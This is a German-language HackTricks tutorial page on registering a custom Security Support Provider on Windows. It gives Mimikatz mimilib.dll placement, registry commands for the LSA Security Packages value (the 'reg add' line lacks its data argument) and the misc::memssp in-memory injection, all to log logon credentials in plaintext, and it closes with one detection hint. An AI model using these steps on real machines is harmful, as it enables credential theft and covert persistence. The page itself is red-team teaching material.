# Custom SSP

{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

### Custom SSP

[Lerne, was ein SSP (Security Support Provider) ist, hier.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
Du kannst dein **eigenes SSP** erstellen, um **Kredentialien** im **Klartext** zu **erfassen**, die verwendet werden, um auf die Maschine zuzugreifen.

#### Mimilib

Du kannst die `mimilib.dll`-Binärdatei verwenden, die von Mimikatz bereitgestellt wird. **Dies wird alle Kredentialien im Klartext in einer Datei protokollieren.**\
Lege die dll in `C:\Windows\System32\` ab.\
Hole dir eine Liste der vorhandenen LSA-Sicherheits-Pakete:

{% code title="attacker@target" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

Fügen Sie `mimilib.dll` zur Liste der Sicherheitsunterstützungsanbieter (Sicherheits-Pakete) hinzu:
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
Und nach einem Neustart können alle Anmeldeinformationen im Klartext in `C:\Windows\System32\kiwissp.log` gefunden werden.

#### Im Speicher

Sie können dies auch direkt im Speicher mit Mimikatz injizieren (beachten Sie, dass es ein wenig instabil/nicht funktionieren könnte):
```powershell
privilege::debug
misc::memssp
```
This won't survive reboots.

#### Minderung

Ereignis-ID 4657 - Überwachung der Erstellung/Änderung von `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
